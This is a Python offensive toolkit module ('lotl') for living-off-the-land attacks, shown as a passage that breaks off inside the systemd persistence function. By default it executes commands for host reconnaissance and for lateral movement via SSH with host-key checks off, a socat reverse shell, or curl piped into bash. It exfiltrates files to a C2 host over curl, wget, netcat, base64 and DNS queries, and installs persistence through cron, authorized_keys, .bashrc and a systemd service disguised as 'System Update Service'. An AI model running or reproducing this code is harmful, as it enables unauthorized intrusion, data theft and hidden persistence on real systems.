"""Living off the land — attack operations using only tools already present on the target.

Builds and executes shell commands using system utilities (nmap, ss, ip, ps, find,
ssh, scp, curl, wget, nc, base64, cron, systemd) without dropping custom binaries.

Usage:
    from lotl import lotl_recon, lotl_lateral_move, lotl_exfil, lotl_persist
    report = lotl_recon("10.0.0.5", scan_type="quick")
    report = lotl_lateral_move("10.0.0.5", "10.0.0.10", method="ssh", credentials={"user": "admin", "password": "secret"})
    report = lotl_exfil("10.0.0.5", "/etc/passwd", "10.99.1.2", 8080, method="curl")
    report = lotl_persist("10.0.0.5", "/tmp/.cache", mechanism="cron")
"""

from __future__ import annotations

import json
import os
import shlex
import subprocess
import time
from dataclasses import dataclass, field
from pathlib import Path
from typing import Any


# ---------------------------------------------------------------------------
# Dataclasses
# ---------------------------------------------------------------------------

@dataclass
class ReconStep:
    """One enumeration step within a recon run."""
    tool: str
    command: str
    status: str  # dry_run | success | failed | not_found
    output: str = ""
    error: str = ""
    duration_ms: int = 0


@dataclass
class ReconReport:
    """Aggregated recon report."""
    host: str
    scan_type: str
    timestamp: str
    steps: list[ReconStep] = field(default_factory=list)
    summary: dict[str, Any] = field(default_factory=dict)


@dataclass
class LateralStep:
    """One step within a lateral movement run."""
    action: str
    command: str
    status: str  # dry_run | success | failed | not_found
    output: str = ""
    error: str = ""
    duration_ms: int = 0


@dataclass
class LateralMoveReport:
    """Lateral movement report."""
    source_host: str
    target_host: str
    method: str
    timestamp: str
    steps: list[LateralStep] = field(default_factory=list)
    summary: dict[str, Any] = field(default_factory=dict)


@dataclass
class ExfilStep:
    """One step within an exfiltration run."""
    action: str
    command: str
    status: str  # dry_run | success | failed | not_found
    output: str = ""
    error: str = ""
    duration_ms: int = 0


@dataclass
class ExfilReport:
    """Exfiltration report."""
    host: str
    data_path: str
    c2_host: str
    c2_port: int
    method: str
    timestamp: str
    steps: list[ExfilStep] = field(default_factory=list)
    summary: dict[str, Any] = field(default_factory=dict)


@dataclass
class PersistStep:
    """One step within a persistence deployment."""
    mechanism: str
    command: str
    status: str  # dry_run | success | failed | not_found
    output: str = ""
    error: str = ""
    duration_ms: int = 0


@dataclass
class PersistReport:
    """Persistence deployment report."""
    host: str
    payload: str
    mechanism: str
    timestamp: str
    steps: list[PersistStep] = field(default_factory=list)
    summary: dict[str, Any] = field(default_factory=dict)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

def _check_binary(name: str) -> bool:
    """Check if a command exists on PATH."""
    try:
        result = subprocess.run(
            ["which", name],
            capture_output=True, text=True, timeout=5
        )
        return result.returncode == 0
    except (subprocess.TimeoutExpired, FileNotFoundError, OSError):
        return False


def _run_cmd(cmd: str, timeout: int = 30) -> tuple[int, str, str, int]:
    """Run a shell command. Returns (returncode, stdout, stderr, duration_ms)."""
    start = time.monotonic()
    try:
        result = subprocess.run(
            cmd,
            shell=True,
            capture_output=True, text=True, timeout=timeout
        )
        elapsed = int((time.monotonic() - start) * 1000)
        return result.returncode, result.stdout, result.stderr, elapsed
    except subprocess.TimeoutExpired:
        elapsed = int((time.monotonic() - start) * 1000)
        return -1, "", "command timed out after " + str(timeout) + "s", elapsed
    except (FileNotFoundError, OSError) as exc:
        elapsed = int((time.monotonic() - start) * 1000)
        return -1, "", str(exc), elapsed


def _now() -> str:
    return time.strftime("%Y-%m-%dT%H:%M:%S%z")


# ---------------------------------------------------------------------------
# LOTL Recon
# ---------------------------------------------------------------------------

def _recon_nmap(host: str, scan_type: str, dry_run: bool) -> ReconStep:
    """Port scan with nmap."""
    if scan_type == "quick":
        cmd = "nmap -T4 --top-ports 100 " + shlex.quote(host)
    elif scan_type == "full":
        cmd = "nmap -T4 -sV -sC -p- " + shlex.quote(host)
    elif scan_type == "udp":
        cmd = "nmap -T4 -sU --top-ports 50 " + shlex.quote(host)
    elif scan_type == "os":
        cmd = "nmap -T4 -O " + shlex.quote(host)
    else:
        cmd = "nmap -T4 -sV " + shlex.quote(host)

    if dry_run:
        return ReconStep(
            tool="nmap",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        )

    if not _check_binary("nmap"):
        return ReconStep(tool="nmap", command=cmd, status="not_found", error="nmap not found on target")

    rc, out, err, ms = _run_cmd(cmd, timeout=120)
    status = "success" if rc == 0 else "failed"
    return ReconStep(tool="nmap", command=cmd, status=status, output=out, error=err, duration_ms=ms)


def _recon_ss(host: str, dry_run: bool) -> ReconStep:
    """List listening sockets."""
    cmd = "ss -tlnp"

    if dry_run:
        return ReconStep(
            tool="ss",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        )

    rc, out, err, ms = _run_cmd(cmd, timeout=15)
    status = "success" if rc == 0 else "failed"
    return ReconStep(tool="ss", command=cmd, status=status, output=out, error=err, duration_ms=ms)


def _recon_ip(host: str, dry_run: bool) -> ReconStep:
    """Network interface and routing info."""
    cmd = "ip addr show && echo '---' && ip route show"

    if dry_run:
        return ReconStep(
            tool="ip",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        )

    rc, out, err, ms = _run_cmd(cmd, timeout=15)
    status = "success" if rc == 0 else "failed"
    return ReconStep(tool="ip", command=cmd, status=status, output=out, error=err, duration_ms=ms)


def _recon_ps(host: str, dry_run: bool) -> ReconStep:
    """Running processes."""
    cmd = "ps auxf"

    if dry_run:
        return ReconStep(
            tool="ps",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        )

    rc, out, err, ms = _run_cmd(cmd, timeout=15)
    status = "success" if rc == 0 else "failed"
    return ReconStep(tool="ps", command=cmd, status=status, output=out, error=err, duration_ms=ms)


def _recon_find(host: str, dry_run: bool) -> ReconStep:
    """Find SUID/SGID binaries and world-writable files."""
    cmd = "find / -perm -4000 -type f 2>/dev/null && echo '---SGID---' && find / -perm -2000 -type f 2>/dev/null && echo '---WRITABLE---' && find / -writable -type f 2>/dev/null | head -50"

    if dry_run:
        return ReconStep(
            tool="find",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        )

    rc, out, err, ms = _run_cmd(cmd, timeout=60)
    status = "success" if rc == 0 else "failed"
    return ReconStep(tool="find", command=cmd, status=status, output=out, error=err, duration_ms=ms)


def _recon_uname(host: str, dry_run: bool) -> ReconStep:
    """System information."""
    cmd = "uname -a && echo '---' && cat /etc/os-release 2>/dev/null && echo '---' && whoami && id"

    if dry_run:
        return ReconStep(
            tool="uname",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        )

    rc, out, err, ms = _run_cmd(cmd, timeout=15)
    status = "success" if rc == 0 else "failed"
    return ReconStep(tool="uname", command=cmd, status=status, output=out, error=err, duration_ms=ms)


def _recon_cron(host: str, dry_run: bool) -> ReconStep:
    """Enumerate cron jobs."""
    cmd = "crontab -l 2>/dev/null && echo '---SYSTEM---' && ls -la /etc/cron.* 2>/dev/null && echo '---DAILY---' && ls -la /etc/cron.d/ 2>/dev/null"

    if dry_run:
        return ReconStep(
            tool="crontab",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        )

    rc, out, err, ms = _run_cmd(cmd, timeout=15)
    status = "success" if rc == 0 else "failed"
    return ReconStep(tool="crontab", command=cmd, status=status, output=out, error=err, duration_ms=ms)


def lotl_recon(host: str, scan_type: str = "full", dry_run: bool = False) -> ReconReport:
    """Use system tools (nmap, ss, ip, ps, find) to enumerate the target.

    Args:
        host: Target host identifier.
        scan_type: Recon depth — quick, full, udp, os (default: full).
        dry_run: If True, return commands without executing (default: False — executes).

    Returns:
        ReconReport with each step's command, status, and output.
    """
    timestamp = _now()
    steps: list[ReconStep] = []

    scanners = [
        lambda: _recon_uname(host, dry_run),
        lambda: _recon_ip(host, dry_run),
        lambda: _recon_ss(host, dry_run),
        lambda: _recon_ps(host, dry_run),
        lambda: _recon_nmap(host, scan_type, dry_run),
        lambda: _recon_find(host, dry_run),
        lambda: _recon_cron(host, dry_run),
    ]

    for scanner in scanners:
        try:
            steps.append(scanner())
        except Exception as exc:
            steps.append(ReconStep(
                tool="unknown",
                command="",
                status="failed",
                error=str(exc),
            ))

    succeeded = sum(1 for s in steps if s.status == "success")
    failed = sum(1 for s in steps if s.status == "failed")
    not_found = sum(1 for s in steps if s.status == "not_found")
    dry_count = sum(1 for s in steps if s.status == "dry_run")

    summary = {
        "total_steps": len(steps),
        "succeeded": succeeded,
        "failed": failed,
        "tools_not_found": not_found,
        "dry_run_steps": dry_count,
        "scan_type": scan_type,
    }

    return ReconReport(
        host=host,
        scan_type=scan_type,
        timestamp=timestamp,
        steps=steps,
        summary=summary,
    )


# ---------------------------------------------------------------------------
# LOTL Lateral Move
# ---------------------------------------------------------------------------

def _lateral_ssh(host: str, target: str, credentials: dict | None, dry_run: bool) -> list[LateralStep]:
    """Lateral movement via SSH with password or key auth."""
    steps: list[LateralStep] = []
    user = credentials.get("user", "root") if credentials else "root"
    password = credentials.get("password", "") if credentials else ""
    key_path = credentials.get("key_path", "") if credentials else ""

    if key_path and Path(key_path).exists():
        cmd = "ssh -i " + shlex.quote(key_path) + " -o StrictHostKeyChecking=no -o ConnectTimeout=10 " + shlex.quote(user) + "@" + shlex.quote(target) + " 'whoami; hostname; id'"
    elif password:
        if _check_binary("sshpass"):
            cmd = "sshpass -p " + shlex.quote(password) + " ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 " + shlex.quote(user) + "@" + shlex.quote(target) + " 'whoami; hostname; id'"
        else:
            steps.append(LateralStep(
                action="ssh_auth",
                command="",
                status="not_found",
                error="sshpass not available for password auth",
            ))
            return steps
    else:
        cmd = "ssh -o StrictHostKeyChecking=no -o ConnectTimeout=10 -o BatchMode=yes " + shlex.quote(user) + "@" + shlex.quote(target) + " 'whoami; hostname; id'"

    if dry_run:
        steps.append(LateralStep(
            action="ssh_connect",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        ))
        return steps

    rc, out, err, ms = _run_cmd(cmd, timeout=30)
    status = "success" if rc == 0 else "failed"
    steps.append(LateralStep(
        action="ssh_connect",
        command=cmd,
        status=status,
        output=out,
        error=err,
        duration_ms=ms,
    ))

    # If successful, try scp a small probe file back
    if rc == 0:
        scp_cmd = "scp -o StrictHostKeyChecking=no -o ConnectTimeout=10 "
        if key_path and Path(key_path).exists():
            scp_cmd += "-i " + shlex.quote(key_path) + " "
        elif password and _check_binary("sshpass"):
            scp_cmd = "sshpass -p " + shlex.quote(password) + " " + scp_cmd
        scp_cmd += shlex.quote(user) + "@" + shlex.quote(target) + ":/etc/hostname /tmp/remote_hostname 2>/dev/null"

        if dry_run:
            steps.append(LateralStep(
                action="scp_probe",
                command=scp_cmd,
                status="dry_run",
                output="Would execute: " + scp_cmd,
            ))
        else:
            rc2, out2, err2, ms2 = _run_cmd(scp_cmd, timeout=20)
            status2 = "success" if rc2 == 0 else "failed"
            steps.append(LateralStep(
                action="scp_probe",
                command=scp_cmd,
                status=status2,
                output=out2,
                error=err2,
                duration_ms=ms2,
            ))

    return steps


def _lateral_socat(host: str, target: str, dry_run: bool) -> list[LateralStep]:
    """Lateral movement via socat reverse shell."""
    steps: list[LateralStep] = []

    # Listener on target side (what the attacker would run on their box)
    listen_cmd = "socat TCP-LISTEN:4444,reuseaddr FILE:`tty`,raw,echo=0"
    # Connector on compromised host
    connect_cmd = "socat EXEC:'bash -i',tcp:" + shlex.quote(target) + ":4444 2>/dev/null &"

    if dry_run:
        steps.append(LateralStep(
            action="socat_listener",
            command=listen_cmd,
            status="dry_run",
            output="Listener on attacker: " + listen_cmd,
        ))
        steps.append(LateralStep(
            action="socat_connect",
            command=connect_cmd,
            status="dry_run",
            output="On compromised host: " + connect_cmd,
        ))
        return steps

    if not _check_binary("socat"):
        steps.append(LateralStep(
            action="socat",
            command=connect_cmd,
            status="not_found",
            error="socat not found on target",
        ))
        return steps

    # We can't actually start the listener here — just attempt the connect side
    rc, out, err, ms = _run_cmd(connect_cmd, timeout=10)
    status = "success" if rc == 0 else "failed"
    steps.append(LateralStep(
        action="socat_connect",
        command=connect_cmd,
        status=status,
        output=out,
        error=err,
        duration_ms=ms,
    ))

    return steps


def _lateral_curl(host: str, target: str, dry_run: bool) -> list[LateralStep]:
    """Lateral movement via curl to a remote shell endpoint."""
    steps: list[LateralStep] = []

    # Download and execute a remote script via bash process substitution
    cmd = "bash -c 'bash <(curl -s http://" + shlex.quote(target) + "/payload.sh)' 2>/dev/null"

    if dry_run:
        steps.append(LateralStep(
            action="curl_exec",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        ))
        return steps

    if not _check_binary("curl"):
        steps.append(LateralStep(
            action="curl_exec",
            command=cmd,
            status="not_found",
            error="curl not found on target",
        ))
        return steps

    rc, out, err, ms = _run_cmd(cmd, timeout=30)
    status = "success" if rc == 0 else "failed"
    steps.append(LateralStep(
        action="curl_exec",
        command=cmd,
        status=status,
        output=out,
        error=err,
        duration_ms=ms,
    ))

    return steps


def lotl_lateral_move(
    host: str,
    target: str,
    method: str = "ssh",
    credentials: dict | None = None,
    dry_run: bool = False,
) -> LateralMoveReport:
    """Use ssh/scp/curl/socat to move laterally without custom binaries.

    Args:
        host: Source/compromised host identifier.
        target: Target host to move to.
        method: Lateral movement method — ssh, socat, curl (default: ssh).
        credentials: Dict with user, password, and/or key_path for SSH auth.
        dry_run: If True, return commands without executing (default: False — executes).

    Returns:
        LateralMoveReport with each step's command, status, and output.
    """
    timestamp = _now()
    steps: list[LateralStep] = []

    method_map = {
        "ssh": lambda: _lateral_ssh(host, target, credentials, dry_run),
        "socat": lambda: _lateral_socat(host, target, dry_run),
        "curl": lambda: _lateral_curl(host, target, dry_run),
    }

    runner = method_map.get(method)
    if runner is None:
        steps.append(LateralStep(
            action="method_select",
            command="",
            status="failed",
            error="unknown method: " + method + " (supported: ssh, socat, curl)",
        ))
    else:
        try:
            steps.extend(runner())
        except Exception as exc:
            steps.append(LateralStep(
                action=method,
                command="",
                status="failed",
                error=str(exc),
            ))

    succeeded = sum(1 for s in steps if s.status == "success")
    failed = sum(1 for s in steps if s.status == "failed")
    not_found = sum(1 for s in steps if s.status == "not_found")
    dry_count = sum(1 for s in steps if s.status == "dry_run")

    summary = {
        "total_steps": len(steps),
        "succeeded": succeeded,
        "failed": failed,
        "tools_not_found": not_found,
        "dry_run_steps": dry_count,
        "method": method,
    }

    return LateralMoveReport(
        source_host=host,
        target_host=target,
        method=method,
        timestamp=timestamp,
        steps=steps,
        summary=summary,
    )


# ---------------------------------------------------------------------------
# LOTL Exfil
# ---------------------------------------------------------------------------

def _exfil_curl(host: str, data_path: str, c2_host: str, c2_port: int, dry_run: bool) -> list[ExfilStep]:
    """Exfiltrate via curl POST."""
    steps: list[ExfilStep] = []
    url = "http://" + shlex.quote(c2_host) + ":" + str(c2_port) + "/upload"
    cmd = "curl -s -X POST -F 'file=@" + shlex.quote(data_path) + "' " + shlex.quote(url)

    if dry_run:
        steps.append(ExfilStep(
            action="curl_upload",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        ))
        return steps

    if not _check_binary("curl"):
        steps.append(ExfilStep(
            action="curl_upload",
            command=cmd,
            status="not_found",
            error="curl not found on target",
        ))
        return steps

    if not Path(data_path).exists():
        steps.append(ExfilStep(
            action="curl_upload",
            command=cmd,
            status="failed",
            error="source file not found: " + data_path,
        ))
        return steps

    rc, out, err, ms = _run_cmd(cmd, timeout=60)
    status = "success" if rc == 0 else "failed"
    steps.append(ExfilStep(
        action="curl_upload",
        command=cmd,
        status=status,
        output=out,
        error=err,
        duration_ms=ms,
    ))

    return steps


def _exfil_wget(host: str, data_path: str, c2_host: str, c2_port: int, dry_run: bool) -> list[ExfilStep]:
    """Exfiltrate via wget POST."""
    steps: list[ExfilStep] = []
    url = "http://" + shlex.quote(c2_host) + ":" + str(c2_port) + "/upload"
    cmd = "wget -q --post-file=" + shlex.quote(data_path) + " " + shlex.quote(url) + " -O /dev/null 2>&1"

    if dry_run:
        steps.append(ExfilStep(
            action="wget_upload",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        ))
        return steps

    if not _check_binary("wget"):
        steps.append(ExfilStep(
            action="wget_upload",
            command=cmd,
            status="not_found",
            error="wget not found on target",
        ))
        return steps

    if not Path(data_path).exists():
        steps.append(ExfilStep(
            action="wget_upload",
            command=cmd,
            status="failed",
            error="source file not found: " + data_path,
        ))
        return steps

    rc, out, err, ms = _run_cmd(cmd, timeout=60)
    status = "success" if rc == 0 else "failed"
    steps.append(ExfilStep(
        action="wget_upload",
        command=cmd,
        status=status,
        output=out,
        error=err,
        duration_ms=ms,
    ))

    return steps


def _exfil_nc(host: str, data_path: str, c2_host: str, c2_port: int, dry_run: bool) -> list[ExfilStep]:
    """Exfiltrate via netcat."""
    steps: list[ExfilStep] = []
    cmd = "cat " + shlex.quote(data_path) + " | nc -w 5 " + shlex.quote(c2_host) + " " + str(c2_port)

    if dry_run:
        steps.append(ExfilStep(
            action="nc_upload",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        ))
        return steps

    if not _check_binary("nc"):
        steps.append(ExfilStep(
            action="nc_upload",
            command=cmd,
            status="not_found",
            error="nc (netcat) not found on target",
        ))
        return steps

    if not Path(data_path).exists():
        steps.append(ExfilStep(
            action="nc_upload",
            command=cmd,
            status="failed",
            error="source file not found: " + data_path,
        ))
        return steps

    rc, out, err, ms = _run_cmd(cmd, timeout=30)
    status = "success" if rc == 0 else "failed"
    steps.append(ExfilStep(
        action="nc_upload",
        command=cmd,
        status=status,
        output=out,
        error=err,
        duration_ms=ms,
    ))

    return steps


def _exfil_base64(host: str, data_path: str, c2_host: str, c2_port: int, dry_run: bool) -> list[ExfilStep]:
    """Exfiltrate via base64-encoded curl POST (for binary-safe transfer)."""
    steps: list[ExfilStep] = []
    url = "http://" + shlex.quote(c2_host) + ":" + str(c2_port) + "/upload"
    cmd = "base64 " + shlex.quote(data_path) + " | curl -s -X POST -d @- " + shlex.quote(url)

    if dry_run:
        steps.append(ExfilStep(
            action="base64_curl_upload",
            command=cmd,
            status="dry_run",
            output="Would execute: " + cmd,
        ))
        return steps

    if not _check_binary("base64") or not _check_binary("curl"):
        missing = []
        if not _check_binary("base64"):
            missing.append("base64")
        if not _check_binary("curl"):
            missing.append("curl")
        steps.append(ExfilStep(
            action="base64_curl_upload",
            command=cmd,
            status="not_found",
            error="not found: " + ", ".join(missing),
        ))
        return steps

    if not Path(data_path).exists():
        steps.append(ExfilStep(
            action="base64_curl_upload",
            command=cmd,
            status="failed",
            error="source file not found: " + data_path,
        ))
        return steps

    rc, out, err, ms = _run_cmd(cmd, timeout=60)
    status = "success" if rc == 0 else "failed"
    steps.append(ExfilStep(
        action="base64_curl_upload",
        command=cmd,
        status=status,
        output=out,
        error=err,
        duration_ms=ms,
    ))

    return steps


def _exfil_dns(host: str, data_path: str, c2_host: str, c2_port: int, dry_run: bool) -> list[ExfilStep]:
    """Exfiltrate via DNS queries (data encoded in subdomain labels)."""
    steps: list[ExfilStep] = []

    # Read file, base64 encode, split into 63-char chunks, send as DNS lookups
    read_cmd = "base64 " + shlex.quote(data_path) + " 2>/dev/null | tr -d '\\n'"
    domain = shlex.quote(c2_host)

    if dry_run:
        steps.append(ExfilStep(
            action="dns_exfil",
            command=read_cmd + " | while read -r chunk; do echo $chunk | fold -w 63 | while read label; do nslookup $label." + domain + " 2>/dev/null; done; done",
            status="dry_run",
            output="Would encode file data in DNS subdomain queries to " + c2_host,
        ))
        return steps

    if not _check_binary("base64") or not _check_binary("nslookup"):
        missing = []
        if not _check_binary("base64"):
            missing.append("base64")
        if not _check_binary("nslookup"):
            missing.append("nslookup")
        steps.append(ExfilStep(
            action="dns_exfil",
            command="",
            status="not_found",
            error="not found: " + ", ".join(missing),
        ))
        return steps

    if not Path(data_path).exists():
        steps.append(ExfilStep(
            action="dns_exfil",
            command="",
            status="failed",
            error="source file not found: " + data_path,
        ))
        return steps

    # Execute: read file, base64, split, send DNS queries
    full_cmd = read_cmd + " | fold -w 63 | while read label; do nslookup " + "$label." + domain + " 2>/dev/null; done"
    rc, out, err, ms = _run_cmd(full_cmd, timeout=60)
    status = "success" if rc == 0 else "failed"
    steps.append(ExfilStep(
        action="dns_exfil",
        command=full_cmd,
        status=status,
        output=out[:500],  # DNS output can be verbose
        error=err,
        duration_ms=ms,
    ))

    return steps


def lotl_exfil(
    host: str,
    data_path: str,
    c2_host: str,
    c2_port: int,
    method: str = "curl",
    dry_run: bool = False,
) -> ExfilReport:
    """Exfiltrate data using system tools (curl, wget, nc, base64, dns).

    Args:
        host: Source host identifier.
        data_path: File or directory path to exfiltrate.
        c2_host: C2 server hostname/IP to send data to.
        c2_port: C2 server port.
        method: Exfil method — curl, wget, nc, base64, dns (default: curl).
        dry_run: If True, return commands without executing (default: False — executes).

    Returns:
        ExfilReport with each step's command, status, and output.
    """
    timestamp = _now()
    steps: list[ExfilStep] = []

    method_map = {
        "curl": lambda: _exfil_curl(host, data_path, c2_host, c2_port, dry_run),
        "wget": lambda: _exfil_wget(host, data_path, c2_host, c2_port, dry_run),
        "nc": lambda: _exfil_nc(host, data_path, c2_host, c2_port, dry_run),
        "base64": lambda: _exfil_base64(host, data_path, c2_host, c2_port, dry_run),
        "dns": lambda: _exfil_dns(host, data_path, c2_host, c2_port, dry_run),
    }

    runner = method_map.get(method)
    if runner is None:
        steps.append(ExfilStep(
            action="method_select",
            command="",
            status="failed",
            error="unknown method: " + method + " (supported: curl, wget, nc, base64, dns)",
        ))
    else:
        try:
            steps.extend(runner())
        except Exception as exc:
            steps.append(ExfilStep(
                action=method,
                command="",
                status="failed",
                error=str(exc),
            ))

    succeeded = sum(1 for s in steps if s.status == "success")
    failed = sum(1 for s in steps if s.status == "failed")
    not_found = sum(1 for s in steps if s.status == "not_found")
    dry_count = sum(1 for s in steps if s.status == "dry_run")

    summary = {
        "total_steps": len(steps),
        "succeeded": succeeded,
        "failed": failed,
        "tools_not_found": not_found,
        "dry_run_steps": dry_count,
        "method": method,
        "data_path": data_path,
        "c2_endpoint": c2_host + ":" + str(c2_port),
    }

    return ExfilReport(
        host=host,
        data_path=data_path,
        c2_host=c2_host,
        c2_port=c2_port,
        method=method,
        timestamp=timestamp,
        steps=steps,
        summary=summary,
    )


# ---------------------------------------------------------------------------
# LOTL Persistence
# ---------------------------------------------------------------------------

def _persist_cron(host: str, payload: str, dry_run: bool) -> list[PersistStep]:
    """Deploy persistence via cron job."""
    steps: list[PersistStep] = []

    # Ensure payload is executable
    chmod_cmd = "chmod +x " + shlex.quote(payload) + " 2>/dev/null"
    # Add cron entry: run every 5 minutes
    cron_cmd = "(crontab -l 2>/dev/null; echo '*/5 * * * * " + payload + "') | crontab -"
    # Verify
    verify_cmd = "crontab -l 2>/dev/null | grep " + shlex.quote(payload)

    if dry_run:
        steps.append(PersistStep(
            mechanism="cron_chmod",
            command=chmod_cmd,
            status="dry_run",
            output="Would execute: " + chmod_cmd,
        ))
        steps.append(PersistStep(
            mechanism="cron_install",
            command=cron_cmd,
            status="dry_run",
            output="Would execute: " + cron_cmd,
        ))
        steps.append(PersistStep(
            mechanism="cron_verify",
            command=verify_cmd,
            status="dry_run",
            output="Would verify cron entry with: " + verify_cmd,
        ))
        return steps

    rc1, out1, err1, ms1 = _run_cmd(chmod_cmd, timeout=10)
    steps.append(PersistStep(
        mechanism="cron_chmod",
        command=chmod_cmd,
        status="success" if rc1 == 0 else "failed",
        output=out1,
        error=err1,
        duration_ms=ms1,
    ))

    rc2, out2, err2, ms2 = _run_cmd(cron_cmd, timeout=10)
    steps.append(PersistStep(
        mechanism="cron_install",
        command=cron_cmd,
        status="success" if rc2 == 0 else "failed",
        output=out2,
        error=err2,
        duration_ms=ms2,
    ))

    rc3, out3, err3, ms3 = _run_cmd(verify_cmd, timeout=10)
    verified = rc3 == 0 and payload in out3
    steps.append(PersistStep(
        mechanism="cron_verify",
        command=verify_cmd,
        status="success" if verified else "failed",
        output=out3,
        error=err3,
        duration_ms=ms3,
    ))

    return steps


def _persist_ssh_key(host: str, payload: str, dry_run: bool) -> list[PersistStep]:
    """Deploy persistence via SSH authorized_keys."""
    steps: list[PersistStep] = []
    ssh_dir = os.path.expanduser("~/.ssh")
    auth_keys = os.path.join(ssh_dir, "authorized_keys")

    # Generate key pair (if needed)
    key_path = os.path.expanduser("~/.lotl_persist_key")
    gen_key_cmd = "ssh-keygen -t ed25519 -f " + shlex.quote(key_path) + " -N '' -q 2>/dev/null"
    # Append public key to authorized_keys
    mkdir_cmd = "mkdir -p " + shlex.quote(ssh_dir) + " && chmod 700 " + shlex.quote(ssh_dir)
    append_cmd = "cat " + shlex.quote(key_path) + ".pub >> " + shlex.quote(auth_keys) + " && chmod 600 " + shlex.quote(auth_keys)
    # Verify
    verify_cmd = "grep -c " + shlex.quote(key_path) + " " + shlex.quote(auth_keys)

    if dry_run:
        steps.append(PersistStep(
            mechanism="ssh_keygen",
            command=gen_key_cmd,
            status="dry_run",
            output="Would execute: " + gen_key_cmd,
        ))
        steps.append(PersistStep(
            mechanism="ssh_dir_setup",
            command=mkdir_cmd,
            status="dry_run",
            output="Would execute: " + mkdir_cmd,
        ))
        steps.append(PersistStep(
            mechanism="ssh_append",
            command=append_cmd,
            status="dry_run",
            output="Would execute: " + append_cmd,
        ))
        steps.append(PersistStep(
            mechanism="ssh_verify",
            command=verify_cmd,
            status="dry_run",
            output="Would verify with: " + verify_cmd,
        ))
        return steps

    # Generate key
    rc1, out1, err1, ms1 = _run_cmd(gen_key_cmd, timeout=10)
    steps.append(PersistStep(
        mechanism="ssh_keygen",
        command=gen_key_cmd,
        status="success" if rc1 == 0 else "failed",
        output=out1,
        error=err1,
        duration_ms=ms1,
    ))

    if rc1 != 0:
        return steps

    # Setup dir
    rc2, out2, err2, ms2 = _run_cmd(mkdir_cmd, timeout=10)
    steps.append(PersistStep(
        mechanism="ssh_dir_setup",
        command=mkdir_cmd,
        status="success" if rc2 == 0 else "failed",
        output=out2,
        error=err2,
        duration_ms=ms2,
    ))

    # Append key
    rc3, out3, err3, ms3 = _run_cmd(append_cmd, timeout=10)
    steps.append(PersistStep(
        mechanism="ssh_append",
        command=append_cmd,
        status="success" if rc3 == 0 else "failed",
        output=out3,
        error=err3,
        duration_ms=ms3,
    ))

    # Verify
    rc4, out4, err4, ms4 = _run_cmd(verify_cmd, timeout=10)
    verified = rc4 == 0 and out4.strip().isdigit() and int(out4.strip()) > 0
    steps.append(PersistStep(
        mechanism="ssh_verify",
        command=verify_cmd,
        status="success" if verified else "failed",
        output=out4,
        error=err4,
        duration_ms=ms4,
    ))

    return steps


def _persist_bashrc(host: str, payload: str, dry_run: bool) -> list[PersistStep]:
    """Deploy persistence via .bashrc injection."""
    steps: list[PersistStep] = []
    bashrc = os.path.expanduser("~/.bashrc")

    # Append payload execution to .bashrc
    append_cmd = "echo '# persist' >> " + shlex.quote(bashrc) + " && echo '" + payload + " &' >> " + shlex.quote(bashrc)
    # Verify
    verify_cmd = "tail -2 " + shlex.quote(bashrc)

    if dry_run:
        steps.append(PersistStep(
            mechanism="bashrc_append",
            command=append_cmd,
            status="dry_run",
            output="Would execute: " + append_cmd,
        ))
        steps.append(PersistStep(
            mechanism="bashrc_verify",
            command=verify_cmd,
            status="dry_run",
            output="Would verify with: " + verify_cmd,
        ))
        return steps

    rc1, out1, err1, ms1 = _run_cmd(append_cmd, timeout=10)
    steps.append(PersistStep(
        mechanism="bashrc_append",
        command=append_cmd,
        status="success" if rc1 == 0 else "failed",
        output=out1,
        error=err1,
        duration_ms=ms1,
    ))

    rc2, out2, err2, ms2 = _run_cmd(verify_cmd, timeout=10)
    verified = rc2 == 0 and "persist" in out2
    steps.append(PersistStep(
        mechanism="bashrc_verify",
        command=verify_cmd,
        status="success" if verified else "failed",
        output=out2,
        error=err2,
        duration_ms=ms2,
    ))

    return steps


def _persist_systemd(host: str, payload: str, dry_run: bool) -> list[PersistStep]:
    """Deploy persistence via systemd user service."""
    steps: list[PersistStep] = []
    service_name = "lotl-persist"
    service_file = os.path.expanduser("~/.config/systemd/user/" + service_name + ".service")
    service_dir = os.path.expanduser("~/.config/systemd/user")

    unit_content = (
        "[Unit]" + "\n"
        "Description=System Update Service" + "\n"
        "" + "\n"
        "[Service]" + "\n"
        "Type=simple" + "\n"
        "ExecStart=" + payload + "\n"
        "Restart=always" + "\n"
        "RestartSec=300" + "\n"
        "" + "\n"
        "[Install]" + "\n"
        "WantedBy=default.target"
    )

    mkdir_cmd = "mkdir -p " + shlex.quote(service_dir)
    write_cmd = "cat > " + shlex.quote(service_file) + " <<'UNITEOF'" + "\n" + unit_content + "\n" + "UNITEOF"
    enable_cmd = "systemctl --user daemon-reload && systemctl --user enable " + service_name + " && systemctl --user start " + service_name
    verify_cmd = "systemctl --user is-active " + service_name + " 2>/dev/null || systemctl --user is-enabled " + service_name + " 2>/dev/null"

    if dry_run:
        steps.append(PersistStep(
            mechanism="systemd_mkdir",
            command=mkdir_cmd,
            status="dry_run",
            output="Would execute: " + mkdir_cmd,
        ))
        steps.append(PersistStep(
            mechanism="systemd_write",
            command=write_cmd,
            status="dry_run",
            output="Would write service unit to: " + service_file,
        ))
        steps.append(PersistStep(
            mechanism="systemd_enable",
            command=enable_cmd,
            status="dry_run",
            output="Would execute: " + enable_cmd,
        ))
        steps.append(PersistStep(
            mechanism="systemd_verify",
            command=verify_cmd,
            status="dry_run",
            output="Would verify with: " + verify_cmd,
        ))
        return steps

    if not _check_binary("systemctl"):
        steps.append(PersistStep(
            mechanism="systemd",
            command=enable_cmd,
            status="not_found",
            error="systemctl not found on target",
        ))
        return steps

    rc1, out1, err1, ms1 = _run_cmd(mkdir_cmd, timeout=10)
    steps.append(PersistStep(
        mechanism="systemd_mkdir",
